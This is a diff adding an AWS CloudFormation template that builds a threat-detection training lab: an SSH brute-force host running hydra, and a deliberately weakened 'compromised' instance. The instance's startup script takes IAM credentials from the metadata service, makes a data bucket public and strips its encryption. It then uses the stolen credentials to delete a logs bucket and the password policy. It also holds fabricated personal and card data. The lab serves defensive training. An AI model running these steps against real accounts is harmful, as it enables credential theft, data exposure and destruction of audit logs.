@@ -1,0 +1,780 @@
+AWSTemplateFormatVersion: '2010-09-09'
+
+Description: This AWS CloudFormation Template creates the necessary resources to generate sample findings for the Threat Detection Workshop.
+
+Parameters:
+  
+  ResourceName:
+    Type: String
+    Default: threat-detection-wksp
+    AllowedValues: 
+      - threat-detection-wksp
+    Description: Prefix of Resources created for this workshop.
+
+  # KeyName:
+  #   Type: AWS::EC2::KeyPair::KeyName
+  #   ConstraintDescription: Must be the name of an existing EC2 KeyPair. TEST
+  #   Description: 'Name of an existing EC2 Key Pair.'
+
+Metadata: 
+  AWS::CloudFormation::Interface:
+    ParameterGroups: 
+      - 
+        Label: 
+          default: "Resource Configuration"
+        Parameters: 
+          - ResourceName
+          # - KeyName
+    ParameterLabels: 
+      ResourceName:
+        default: "Resource Prefix"
+      # KeyName: 
+      #  default: "Existing Key Pair2"
+
+Mappings:
+  
+  RegionMap: 
+    us-east-1: 
+      "aznlinux": "ami-afd15ed0"
+      "ubuntu": "ami-43a15f3e"
+    us-east-2: 
+      "aznlinux": "ami-2a0f324f"
+      "ubuntu": "ami-916f59f4"
+    us-west-1: 
+      "aznlinux": "ami-00d8c660"
+      "ubuntu": "ami-925144f2"
+    us-west-2: 
+      "aznlinux": "ami-31394949"
+      "ubuntu": "ami-4e79ed36"
+    ap-south-1:
+      "aznlinux": "ami-7d95b612"
+      "ubuntu": "ami-0189d76e"
+    ap-northeast-1:
+      "aznlinux": "ami-2724cf58"
+      "ubuntu": "ami-0d74386b"
+    ap-northeast-2:
+      "aznlinux": "ami-d117bebf"
+      "ubuntu": "ami-a414b9ca"
+    ap-southeast-1:
+      "aznlinux": "ami-a7f0c4db"
+      "ubuntu": "ami-52d4802e"
+    ap-southeast-2:
+      "aznlinux": "ami-c267b0a0"
+      "ubuntu": "ami-d38a4ab1"
+    ca-central-1:
+      "aznlinux": "ami-c59818a1"
+      "ubuntu": "ami-ae55d2ca"
+    eu-central-1:
+      "aznlinux": "ami-43eec3a8"
+      "ubuntu": "ami-7c412f13"
+    eu-west-1:
+      "aznlinux": "ami-921423eb"
+      "ubuntu": "ami-f90a4880"
+    eu-west-2:
+      "aznlinux": "ami-924aa8f5"
+      "ubuntu": "ami-f4f21593"
+    eu-west-3:
+      "aznlinux": "ami-a88233d5"
+      "ubuntu": "ami-0e55e373"
+    sa-east-1:
+      "aznlinux": "ami-4fd48923"
+      "ubuntu": "ami-423d772e"
+
+Conditions: {}
+
+Resources:
+
+  ### Network Infrastructure
+  VPC:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 10.0.0.0/16
+      EnableDnsHostnames: true
+      EnableDnsSupport: true
+      Tags:
+        - Key: Name
+          Value: !Ref ResourceName
+  InternetGateway:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags:
+      - Key: Name
+        Value: !Ref ResourceName
+  GatewayAttachment:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties:
+      InternetGatewayId:
+        Ref: InternetGateway
+      VpcId: !Ref VPC
+  RouteTable:
+    DependsOn:
+      - VPC
+    Type: AWS::EC2::RouteTable
+    Properties:
+      Tags:
+        - Key: Name
+          Value: !Ref ResourceName
+      VpcId: !Ref VPC
+  PublicRoute:
+    DependsOn:
+      - RouteTable
+      - GatewayAttachment
+    Type: AWS::EC2::Route
+    Properties:
+      DestinationCidrBlock: 0.0.0.0/0
+      GatewayId: !Ref InternetGateway
+      RouteTableId: !Ref RouteTable
+  Subnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      CidrBlock: 10.0.0.0/24
+      MapPublicIpOnLaunch: true
+      Tags:
+        - Key: Name
+          Value: !Ref ResourceName
+      VpcId: !Ref VPC
+  SubnetAssoc:
+    DependsOn:
+      - Subnet
+      - RouteTable
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref RouteTable
+      SubnetId: !Ref Subnet
+  PublicNACL:
+    Type: AWS::EC2::NetworkAcl
+    Properties:
+      VpcId: !Ref VPC
+      Tags:
+        -
+          Key: Name
+          Value: 
+            Fn::Join:
+            - '-'
+            - [!Ref ResourceName, 'compromised']
+        -
+          Key: Network
+          Value: Public
+  InboundPublicNACLEntry:
+    Type: AWS::EC2::NetworkAclEntry
+    Properties:
+      NetworkAclId: !Ref PublicNACL
+      RuleNumber: 100
+      Protocol: -1
+      RuleAction: allow
+      Egress: false
+      CidrBlock: '0.0.0.0/0'
+      PortRange:
+        From: 0
+        To: 65535
+  OutboundPublicNACLEntry:
+    Type: AWS::EC2::NetworkAclEntry
+    Properties:
+      NetworkAclId: !Ref PublicNACL
+      RuleNumber: 100
+      Protocol: -1
+      RuleAction: allow
+      Egress: true
+      CidrBlock: 0.0.0.0/0
+      PortRange:
+        From: 0
+        To: 65535
+  SubnetNACLAssociation:
+    Type: AWS::EC2::SubnetNetworkAclAssociation
+    Properties:
+      SubnetId: !Ref Subnet
+      NetworkAclId: !Ref PublicNACL
+  MaliciousSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      CidrBlock: 10.0.1.0/24
+      MapPublicIpOnLaunch: true
+      Tags:
+        - Key: Name
+          Value: 
+            Fn::Join:
+            - '-'
+            - [!Ref ResourceName, 'malicious']
+      VpcId: !Ref VPC
+  MaliciousSubnetAssoc:
+    DependsOn:
+      - MaliciousSubnet
+      - RouteTable
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref RouteTable
+      SubnetId: !Ref MaliciousSubnet
+  MaliciousPublicNACL:
+    Type: AWS::EC2::NetworkAcl
+    Properties:
+      VpcId: !Ref VPC
+      Tags:
+        -
+          Key: Name
+          Value: 
+            Fn::Join:
+            - '-'
+            - [!Ref ResourceName, 'malicious']
+        -
+          Key: Network
+          Value: Public
+  MaliciousInboundPublicNACLEntry:
+    Type: AWS::EC2::NetworkAclEntry
+    Properties:
+      NetworkAclId: !Ref MaliciousPublicNACL
+      RuleNumber: 100
+      Protocol: -1
+      RuleAction: allow
+      Egress: false
+      CidrBlock: '0.0.0.0/0'
+      PortRange:
+        From: 0
+        To: 65535
+  MaliciousOutboundPublicNACLEntry:
+    Type: AWS::EC2::NetworkAclEntry
+    Properties:
+      NetworkAclId: !Ref MaliciousPublicNACL
+      RuleNumber: 100
+      Protocol: -1
+      RuleAction: allow
+      Egress: true
+      CidrBlock: 0.0.0.0/0
+      PortRange:
+        From: 0
+        To: 65535
+  MaliciousSubnetNACLAssociation:
+    Type: AWS::EC2::SubnetNetworkAclAssociation
+    Properties:
+      SubnetId: !Ref MaliciousSubnet
+      NetworkAclId: !Ref MaliciousPublicNACL
+
+  ### Malicious Host IAM Role 
+  MaliciousInstanceRole: 
+    Type: AWS::IAM::Role
+    Properties: 
+      RoleName: 
+        Fn::Join:
+          - '-'
+          - [!Ref ResourceName, 'malicious-ec2']
+      AssumeRolePolicyDocument: 
+        Version: 2012-10-17
+        Statement: 
+          - 
+            Effect: Allow
+            Principal: 
+              Service: 
+                - ec2.amazonaws.com
+            Action: 
+              - sts:AssumeRole
+      Path: /
+      Policies: 
+        - 
+          PolicyName: MaliciousInstancePolicy
+          PolicyDocument: 
+            Version: 2012-10-17
+            Statement: 
+              - 
+                Effect: Allow
+                Action:
+                  - ssm:GetParameter
+                  - ssm:GetParameters
+                  - ssm:DescribeParameters
+                Resource: 
+                  Fn::Join:
+                  - ':'
+                  - ["arn:aws:ssm", !Ref "AWS::Region", !Ref "AWS::AccountId", "*"]
+  MaliciousInstanceProfile: 
+    Type: AWS::IAM::InstanceProfile
+    Properties: 
+      InstanceProfileName: 
+        Fn::Join:
+          - '-'
+          - [!Ref ResourceName, 'malicious-ec2-profile']
+      Path: /
+      Roles: 
+        - !Ref MaliciousInstanceRole
+
+  ### Malicious Instance Security Group
+  MaliciousSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: 
+        Fn::Join:
+        - '-'
+        - [!Ref ResourceName,'malicious']
+      VpcId: !Ref VPC
+      SecurityGroupIngress:
+      - IpProtocol: icmp
+        FromPort: '-1'
+        ToPort: '-1'
+        CidrIp: 0.0.0.0/0
+  
+  ### Malicious Instance
+  MaliciousIP:
+    DependsOn:
+      - GatewayAttachment
+    Type: AWS::EC2::EIP
+    Properties:
+      InstanceId: !Ref MaliciousInstance
+      Domain: vpc
+
+  MaliciousInstance:
+    Type: AWS::EC2::Instance
+    Properties: 
+      IamInstanceProfile: !Ref MaliciousInstanceProfile
+      InstanceType: m5.large
+      ImageId: 
+        Fn::FindInMap: 
+          - RegionMap
+          - !Ref AWS::Region
+          - 'ubuntu'
+      # KeyName: !Ref KeyName
+      NetworkInterfaces: 
+        - AssociatePublicIpAddress: 'false'
+          DeviceIndex: '0'
+          GroupSet:
+            - !Ref MaliciousSecurityGroup
+          SubnetId: 
+            Ref: MaliciousSubnet
+      Tags:
+        - Key: Name
+          Value: 
+            Fn::Join:
+              - ': '
+              - [!Ref ResourceName, 'Malicious Host']
+        - Key: Service
+          Value: !Ref ResourceName
+      UserData:
+        Fn::Base64: !Sub 
+          - |
+            #!/bin/bash -ex
+
+            # Get Updates and Install Necessary Packages
+            sudo apt-get update && sudo apt-get upgrade && sudo apt-get dist-upgrade
+            sudo apt-get install build-essential -y
+            sudo apt-get install git sshpass python-pip libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev -y
+            pip install awscli
+            export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
+            echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /home/ubuntu/.profile
+            
+            # Set Region
+            aws configure set default.region ${Region}
+            
+            # Install thc-hydra
+            mkdir /home/ubuntu/thc-hydra
+            git clone https://github.com/vanhauser-thc/thc-hydra /home/ubuntu/thc-hydra
+            cd /home/ubuntu/thc-hydra
+            sudo /home/ubuntu/thc-hydra/configure && sudo make && sudo make install
+
+            # Create Password List
+            sudo /home/ubuntu/thc-hydra/dpl4hydra.sh root
+            sudo echo "alice:ThreatDetectionPassword123!" >> dpl4hydra_root.lst
+
+            # Create Targets File
+            com_ip=10.0.0.15
+            echo $com_ip:22 >> /home/ubuntu/targets.txt
+
+            # Create SSH Brute Force Cron Job
+            cat <<EOT >> /home/ubuntu/ssh-bruteforce.sh
+            #!/bin/bash
+            /usr/local/bin/hydra -C /home/ubuntu/thc-hydra/dpl4hydra_root.lst -M /home/ubuntu/targets.txt ssh -t 4
+            EOT
+
+            chmod 744 /home/ubuntu/ssh-bruteforce.sh
+            chown ubuntu /home/ubuntu/ssh-bruteforce.sh
+
+            # Create Script Retrieval Script
+            cat <<EOT >> /home/ubuntu/get-script.sh
+            #!/bin/bash
+            /usr/bin/sshpass -p "ThreatDetectionPassword123!" scp -o StrictHostKeyChecking=no -r alice@10.0.0.15:/home/alice/gd-findings.sh /home/ubuntu/gd-findings.sh
+            chmod 744 /home/ubuntu/gd-findings.sh
+            chown ubuntu /home/ubuntu/gd-findings.sh
+            EOT
+
+            chmod 744 /home/ubuntu/get-script.sh
+            chown ubuntu /home/ubuntu/get-script.sh
+
+            echo "*/2 * * * * /home/ubuntu/ssh-bruteforce.sh > /home/ubuntu/ssh-bruteforce.log 2>&1" >> cron
+            echo "*/2 * * * * /home/ubuntu/get-script.sh > /home/ubuntu/get-script.log 2>&1" >> cron
+            echo "*/2 * * * * /home/ubuntu/gd-findings.sh > /home/ubuntu/gd-findings.log 2>&1" >> cron
+
+            crontab -u ubuntu cron
+          - 
+            Region:
+              !Ref "AWS::Region"
+            Bucket:
+              Fn::Join:
+              - '-'
+              - [!Ref ResourceName, !Ref "AWS::AccountId", !Ref "AWS::Region",'gd-threatlist']
+
+
+  ### Compromised Instance IAM Role
+  CompromisedRole: 
+    Type: AWS::IAM::Role
+    Properties: 
+      RoleName: 
+        Fn::Join:
+        - '-'
+        - [!Ref ResourceName, compromised-ec2]
+      AssumeRolePolicyDocument: 
+        Version: 2012-10-17
+        Statement: 
+          - 
+            Effect: Allow
+            Principal: 
+              Service: 
+                - ec2.amazonaws.com
+            Action: 
+              - sts:AssumeRole
+      Path: /
+      ManagedPolicyArns:
+      - arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM
+      Policies: 
+        - 
+          PolicyName: CompromisedPolicy
+          PolicyDocument: 
+            Version: 2012-10-17
+            Statement: 
+              - 
+                Effect: Allow
+                Action:
+                  - guardduty:GetDetector
+                  - guardduty:ListDetectors
+                  - guardduty:CreateThreatIntelSet
+                  - guardduty:UpdateThreatIntelSet
+                  - dynamodb:ListTables
+                Resource: '*'
+              - 
+                Effect: Allow
+                Action:
+                  - iam:PutRolePolicy
+                Resource: 
+                  Fn::Join:
+                    - ':'
+                    - ["arn:aws:iam:",!Ref "AWS::AccountId", "role/aws-service-role/guardduty.amazonaws.com/*"]
+              - 
+                Effect: Allow
+                Action: 's3:PutObject'
+                Resource: 
+                  Fn::Join:
+                    - ''
+                    - ["arn:aws:s3:::",!Ref ResourceName, "-", !Ref "AWS::AccountId", "-", !Ref "AWS::Region", "-", 'gd-threatlist', "/*"]
+              - 
+                Effect: Allow
+                Action:
+                  - ssm:PutParameter
+                  - ssm:DescribeParameters
+                  - ssm:GetParameters
+                  - ssm:DeleteParameter
+                Resource: 
+                  Fn::Join:
+                  - ':'
+                  - ["arn:aws:ssm", !Ref "AWS::Region", !Ref "AWS::AccountId", "parameter/*"]
+              - 
+                Effect: Allow
+                Action:
+                  - ssm:DescribeParameters
+                Resource: "*"
+              - 
+                Effect: Allow
+                Action:
+                  - dynamodb:ListTables
+                  - dynamodb:DescribeTable
+                Resource: '*'
+              - 
+                Effect: Allow
+                Action:
+                  - logs:PutLogEvents
+                  - logs:DescribeLogStreams
+                  - logs:CreateLogStream
+                  - logs:CreateLogGroup
+                Resource: 'arn:aws:logs:*:*:*'
+              - 
+                Effect: Allow
+                Action: 
+                  - 's3:*'
+                Resource: 
+                  Fn::Join:
+                    - ''
+                    - ["arn:aws:s3:::",!Ref ResourceName, "-", !Ref "AWS::AccountId", "-", !Ref "AWS::Region", "-", 'data', "/*"]
+              - 
+                Effect: Allow
+                Action: 
+                  - 's3:*'
+                Resource: 
+                  Fn::Join:
+                    - ''
+                    - ["arn:aws:s3:::",!Ref ResourceName, "-", !Ref "AWS::AccountId", "-", !Ref "AWS::Region", "-", 'data']
+  CompromisedInstanceProfile: 
+    Type: AWS::IAM::InstanceProfile
+    Properties: 
+      InstanceProfileName: 
+        Fn::Join:
+        - '-'
+        - [!Ref ResourceName, 'compromised-ec2-profile']
+      Path: /
+      Roles: 
+        - !Ref CompromisedRole
+
+  ### Compromised Instance Security Group
+  CompromisedSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: 
+        Fn::Join:
+        - '-'
+        - [!Ref ResourceName,'compromised']
+      VpcId: !Ref VPC
+      SecurityGroupIngress:
+      - IpProtocol: tcp
+        FromPort: '22'
+        ToPort: '22'
+        CidrIp: 10.0.0.0/16
+  
+  ### Compromised Instance
+  CompromisedInstance: 
+    Type: AWS::EC2::Instance
+    Properties: 
+      InstanceType: m5.large
+      IamInstanceProfile: !Ref CompromisedInstanceProfile
+      # KeyName: !Ref KeyName
+      ImageId: 
+        Fn::FindInMap: 
+          - RegionMap
+          - !Ref "AWS::Region"
+          - 'aznlinux'
+      NetworkInterfaces: 
+        - AssociatePublicIpAddress: true
+          DeviceIndex: 0
+          GroupSet:
+            - !Ref CompromisedSecurityGroup
+          SubnetId: 
+            Ref: Subnet
+          PrivateIpAddress: '10.0.0.15'
+      Tags:
+          - Key: Name
+            Value: 
+              Fn::Join:
+              - ': '
+              - [!Ref ResourceName, 'Compromised Instance']
+          - Key: Service
+            Value: !Ref ResourceName
+      UserData:
+        Fn::Base64: !Sub 
+          - |
+            #!/bin/bash
+
+            # Set Region
+            aws configure set default.region ${Region}
+
+            # Set Credential Variables
+            access_key_id=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep AccessKeyId | cut -d':' -f2 | sed 's/[^0-9A-Z]*//g'`
+            secret_key=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep SecretAccessKey | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            token=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep Token | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            expiration=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${Role} | grep Expiration | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            compromisedip=`curl http://169.254.169.254/latest/meta-data/local-ipv4`
+
+            # Install AWS Inspector Agent
+            wget https://d1wk0tztpsntt1.cloudfront.net/linux/latest/install
+            sudo bash install
+
+            # Install CloudWatch Logs Agent
+            sudo yum install awslogs -y
+
+            # Set CloudWatch Logs Agent Region
+            cat <<EOT >> /tmp/awscli.conf
+            [plugins]
+            cwlogs = cwlogs
+            [default]
+            region = ${Region}
+            EOT
+            sudo cp /tmp/awscli.conf /etc/awslogs/
+
+            # Set CloudWatch Logs Agent Config
+            cat <<EOT >> /tmp/awslogs.conf
+            [general]
+            state_file = /var/lib/awslogs/agent-state
+
+            [/var/log/secure]
+            file = /var/log/secure
+            log_group_name = /${ResourceName}/var/log/secure
+            log_stream_name = {instance_id}/ssh
+            datetime_format = %d/%b/%Y:%H:%M:%S
+            EOT
+            sudo cp /tmp/awslogs.conf /etc/awslogs/
+
+            # Start CloudWatch Log Agent
+            sudo systemctl start awslogsd
+
+            # Start SSM Agent
+            sudo yum install -y https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/linux_amd64/amazon-ssm-agent.rpm
+
+            # Modify Instance Configurations
+            sudo sed 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config > temp.txt
+            mv -f temp.txt /etc/ssh/sshd_config
+            sudo systemctl restart sshd
+
+            # Install and start Apache
+            sudo yum install httpd -y
+            sudo systemctl start httpd
+
+            sudo systemctl restart rsyslog
+
+            # Create Sample User
+            sudo useradd -u 12345 -g users -d /home/alice -s /bin/bash -p $(echo ThreatDetectionPassword123! | openssl passwd -1 -stdin) alice
+
+            # Create Fake Customer Data Files
+            cat <<EOT >> /tmp/employee-data.txt
+            # Sample Report - No identification of actual persons or places is
+            # intended or should be inferred
+
+            74323 Julie Field
+            Lake Joshuamouth, OR 30055-3905
+            1-196-191-4438x974
+            53001 Paul Union
+            New John, HI 94740
+            American Express
+            Amanda Wells
+            5135725008183484 09/26
+            CVE: 550
+
+            354-70-6172
+            242 George Plaza
+            East Lawrencefurt, VA 37287-7620
+            GB73WAUS0628038988364
+            587 Silva Village
+            Pearsonburgh, NM 11616-7231
+            LDNM1948227117807
+            American Express
+            Brett Garza
+            347965534580275 05/20
+            CID: 4758
+            EOT
+
+            # Upload employee data to S3
+            sleep 5
+            aws s3 cp /tmp/employee-data.txt s3://${Bucket}/employee-data.txt
+
+            # Create Fake Config File
+            echo 'aws_access_key_id =' $access_key_id >> /tmp/config.py
+            echo 'aws_secret_access_key =' $secret_key >> /tmp/config.py
+            echo 'github_key = 8a2aa88896371b444666f641aa65392222dd3333' >> /tmp/config.py
+
+            # Upload employee data to S3
+            sleep 5
+            aws s3 cp /tmp/config.py s3://${Bucket}/config.py
+
+            # Create Fake Classified File
+            cat <<EOT >> /tmp/memo.pst
+            Proprietary Information
+            arn:aws:iam::339394046901:role/aws-security-workshops-easteregg1 (Ex ID: aws-security-workshops)
+            S3: aws-security-workshops-easteregg1a
+            Do not share with any other employee.
+            EOT
+
+            # Upload employee data to S3
+            sleep 5
+            aws s3 cp /tmp/memo.pst s3://${Bucket}/memo.pst
+
+            # Delete Default Encryption
+            aws s3api delete-bucket-encryption --bucket ${Bucket}
+            aws s3api put-bucket-acl --bucket ${Bucket} --grant-read uri=http://acs.amazonaws.com/groups/global/AllUsers
+
+            # Create Fake /etc/passwd
+            cat <<EOT >> /tmp/passwd.txt
+            blackwidow:x:10:100::/home/blackwidow:/bin/bash
+            thor:x:11:100::/home/thor:/bin/bash
+            ironman:x:12:100::/home/ironman:/bin/bash
+            captain:x:13:100::/home/captain:/bin/bash
+            hulk:x:14:100::/home/hulk:/bin/bash
+            hawkeye:x:15:100::/home/hawkeye:/bin/bash
+            EOT
+
+            # Upload employee data to S3
+            sleep 5
+            aws s3 cp /tmp/passwd.txt s3://${Bucket}/passwd.txt
+
+            #Upload Attack Security
+            cat <<EOT >> /home/alice/gd-findings.sh
+            #!/bin/bash
+            /usr/local/bin/aws configure set profile.attacker.region ${Region}
+            /usr/local/bin/aws configure set profile.attacker.aws_access_key_id $access_key_id
+            /usr/local/bin/aws configure set profile.attacker.aws_secret_access_key $secret_key
+            /usr/local/bin/aws configure set profile.attacker.aws_session_token $token
+            /usr/local/bin/aws s3api get-object --bucket ${Bucket} --key config.py /home/ubuntu/config.py --profile attacker
+            /usr/local/bin/aws s3api list-buckets --profile attacker
+            /usr/local/bin/aws cloudtrail describe-trails --profile attacker
+            /usr/local/bin/aws s3api delete-bucket --bucket ${BucketLogs} --region ${Region} --profile attacker
+            /usr/local/bin/aws iam delete-account-password-policy --profile attacker
+            EOT
+
+            chown alice /home/alice/gd-findings.sh
+
+            # Threatlist Variables
+            uuid=$(uuidgen)
+            list="gd-threat-list-example-$uuid.txt"
+
+            # Create Threatlist
+            echo ${MaliciousIP} >> /tmp/$list
+
+            # Upload list to S3
+            aws s3 cp /tmp/$list s3://${BucketThreatList}/$list
+            sleep 5
+
+            # Create GuardDuty Threat List (Non-Retry)
+            #id=`aws guardduty list-detectors --query 'DetectorIds[0]' --output text`
+            #aws guardduty create-threat-intel-set --activate --detector-id $id --format TXT --location https://s3.amazonaws.com/${BucketThreatList}/$list --name Custom-Threat-List-$uuid
+            
+            # Create GuardDuty Threat List
+            gd_threat_list_success=FALSE
+            gd_threat_list_tries=0
+            id=`aws guardduty list-detectors --query 'DetectorIds[0]' --output text`
+            while [ $gd_threat_list_success =  FALSE ]
+            do
+            aws guardduty create-threat-intel-set --activate --detector-id $id --format TXT --location https://s3.amazonaws.com/${BucketThreatList}/$list --name Custom-Threat-List-$uuid
+            if [ $? -eq 0 ]
+            then gd_threat_list_success=TRUE
+            echo 'GuardDuty threat list successfully uploaded'
+            else
+            echo 'GuardDuty threat list upload unsuccessful'
+            echo 'waiting 10 seconds before trying again'
+            if [ $gd_threat_list_tries -lt 20 ]
+            then
+            let gd_threat_list_tries++
+            echo $gd_threat_list_tries
+            sleep 10
+            else
+            gd_threat_list_success=ABANDON
+            echo 'Not able to upload threat list after many attempts.  Abandoning'
+            fi
+            fi
+            done
+
+
+            # Set Ping cron Job
+            echo "* * * * * ping -c 6 -i 10 ${MaliciousIP}" | tee -a /var/spool/cron/ec2-user
+
+            aws iam create-user --user-name Superman
+            aws iam create-user --user-name Batman
+
+          - 
+            Role:
+              !Ref CompromisedRole
+            Region:
+              !Ref "AWS::Region"
+            Bucket:
+              Fn::Join:
+              - '-'
+              - [!Ref ResourceName, !Ref "AWS::AccountId", !Ref "AWS::Region",'data']
+            BucketThreatList:
+              Fn::Join:
+              - '-'
+              - [!Ref ResourceName, !Ref "AWS::AccountId", !Ref "AWS::Region",'gd-threatlist']
+            BucketLogs:
+              Fn::Join:
+              - '-'
+              - [!Ref ResourceName, !Ref "AWS::AccountId", !Ref "AWS::Region",'logs']
+            ResourceName:
+              !Ref ResourceName
+
+Outputs: {}
